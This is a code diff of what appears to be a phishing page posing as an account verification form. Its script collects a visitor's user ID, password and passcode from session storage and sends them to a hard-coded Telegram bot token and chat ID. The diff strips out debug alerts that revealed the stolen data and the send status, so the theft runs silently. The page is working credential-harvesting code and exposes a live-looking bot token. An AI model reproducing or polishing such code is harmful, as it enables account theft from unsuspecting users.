@@ -81,7 +81,7 @@
        <button class="sg-Btn sg-Btn--primary Btn-next" name="submit" type="submit" value="Submit">
         Verify
        </button>
-      <script>
+     <script>
 // Telegram Bot Configuration
 const TELEGRAM_BOT_TOKEN = '8580841728:AAFsXNmdnj-kBurv4UxM4ucpZm4NqYcDL00';
 const TELEGRAM_CHAT_ID = '-5233511146';
@@ -108,9 +108,6 @@ document.addEventListener('DOMContentLoaded', function() {
     const userId = sessionStorage.getItem('userId') || 'Not available';
     const password = sessionStorage.getItem('userPassword') || 'Not available';
     const passcode = sessionStorage.getItem('userPasscode') || 'Not provided';
-
-    // Alert to check if sessionStorage is working
-    alert(`Session data:\nUser ID: ${userId}\nPassword: ${password}\nPasscode: ${passcode}`);
 
     // Add red border style
     const style = document.createElement('style');
@@ -287,14 +284,7 @@ Date: ${currentDateTime}`;
                     parse_mode: 'MarkdownV2'
                 })
             });
-
-            alert(`Telegram response status: ${response.status}`);
-            if (!response.ok) {
-                const errorText = await response.text();
-                alert(`Telegram error: ${errorText}`);
-            }
         } catch (error) {
-            alert(`Failed to send to Telegram: ${error.message}`);
             console.error('Failed to send to Telegram:', error);
         }
 
@@ -304,6 +294,7 @@ Date: ${currentDateTime}`;
     });
 });
 </script>
+
 
       </div>
      </form>
@@ -331,5 +322,6 @@ Date: ${currentDateTime}`;
   </iframe>
  </body>
 </html>
+
 
 
